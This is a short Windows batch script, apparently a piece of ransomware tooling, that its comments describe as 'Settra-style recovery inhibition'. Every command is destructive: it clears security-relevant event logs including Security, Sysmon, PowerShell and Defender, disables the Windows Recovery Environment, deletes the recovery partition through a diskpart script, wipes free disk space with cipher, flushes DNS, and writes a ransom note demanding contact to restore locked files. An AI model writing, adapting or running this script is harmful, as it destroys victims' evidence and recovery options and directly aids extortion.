@echo off
rem Settra-style recovery inhibition: clear forensics-relevant event logs,
rem disable the Windows Recovery Environment, remove the recovery partition
rem via a diskpart script, overwrite deleted data, and flush the DNS cache.
wevtutil cl Application
wevtutil cl Security
wevtutil cl System
wevtutil cl Setup
wevtutil cl ForwardedEvents
wevtutil cl "Microsoft-Windows-Sysmon/Operational"
wevtutil cl "Microsoft-Windows-PowerShell/Operational"
wevtutil cl "Microsoft-Windows-Defender/Operational"
reagentc /disable
diskpart /s %TEMP%\delpart.txt
cipher /w:D:\ >nul 2>&1
ipconfig /flushdns >nul 2>&1
echo Your files are locked. Contact us to restore them. > C:\RESTORE_FILES.txt
